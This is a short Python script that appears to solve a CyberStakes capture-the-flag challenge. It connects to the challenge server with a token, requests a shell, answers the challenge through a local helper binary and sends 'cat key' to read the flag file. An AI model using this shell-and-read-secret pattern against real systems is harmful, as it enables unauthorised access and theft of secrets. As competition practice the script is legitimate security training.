#!/usr/bin/env python

import socket
import subprocess

addr = 'shell.cyberstakesonline.com'
port = 50143
tok = '828C2EE84B\n'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((addr, port))

print(s.recv(1024))
s.send(tok)
print(s.recv(1024))
s.send("SHELL\n")
print(s.recv(1024))
print('---')
p = subprocess.Popen(['./do_chal'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
stdout, stderr = p.communicate(s.recv(1024))
s.send(stdout)
print(s.recv(1024))
s.send('cat key\n')
print(s.recv(1024))
